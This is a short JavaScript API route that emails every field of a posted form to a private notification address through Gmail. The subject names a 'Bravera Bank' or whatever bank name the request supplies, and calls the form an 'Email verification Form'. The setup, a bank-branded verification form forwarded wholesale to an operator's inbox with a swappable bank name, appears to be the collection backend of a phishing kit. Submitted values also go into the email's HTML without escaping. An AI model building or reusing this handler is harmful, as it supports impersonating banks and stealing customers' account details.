import nodemailer from 'nodemailer';

export async function POST(request) {
  try {
    const data = await request.json();
    
    // Create transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_APP_PASSWORD,
      },
    });
    
    // Configure email options based on data type
    let mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL,
      subject: `${data.bankName || 'Bravera Bank'} - Email verification Form`,
      html: generateEmailContent(data),
    };
    
    // Send the email
    await transporter.sendMail(mailOptions);
    
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
    
  } catch (error) {
    console.error('Email sending failed:', error);
    return new Response(JSON.stringify({ error: 'Failed to send email' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

function generateEmailContent(data) {
  // This function generates appropriate HTML based on the data
  let html = `
    <h2>${data.bankName || 'Bravera Bank'} Form Submission</h2>
    <p>Submitted at: ${new Date().toString()}</p>
    <table border="1" cellpadding="10">
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
  `;
  
  // Add all data fields to the email
  Object.entries(data).forEach(([key, value]) => {
    if (key !== 'bankName' && key !== 'to_email') {
      html += `
        <tr>
          <td><strong>${key}</strong></td>
          <td>${value}</td>
        </tr>
      `;
    }
  });
  
  html += `</table>`;
  return html;
}